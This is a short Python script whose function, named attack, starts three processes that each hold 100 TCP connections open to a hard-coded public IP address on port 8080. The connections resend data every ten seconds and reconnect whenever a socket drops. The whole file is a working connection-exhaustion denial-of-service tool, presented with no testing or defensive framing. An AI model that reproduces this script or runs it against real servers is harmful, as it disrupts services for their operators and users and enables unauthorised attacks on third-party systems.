import socket
import time
import multiprocessing
import os

no_of_process = 3
list_process = []
host = "35.193.17.254"
port = 8080


def attack():
    connections = []
    data = "google"

    def create_connection():
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            pid = os.getpid()
            print(f"Connecting from Process{pid}")
            my_socket.connect((host, port))
            return my_socket

        except socket.error:
            print(f"Socket Error")
            my_socket.close()

    def send_data():
        for x in connections:
            try:
                x.send(data.encode())
                receive_data = x.recv(1024)
                print(f"Data from server:{receive_data}")
            except socket.error as msg:
                print(f"Error Sending{msg}")
                x.close()
                connections.remove(x)
                new_x = create_connection()
                connections.append(new_x)
        time.sleep(10)
        send_data()

    for z in range(0, 100):
        returned_sock = create_connection()
        connections.append(returned_sock)

    send_data()


for i in range(0, no_of_process):
    process = multiprocessing.Process(target=attack, )
    process.start()
    list_process.append(process)

for i in range(0, no_of_process):
    list_process[i].join()
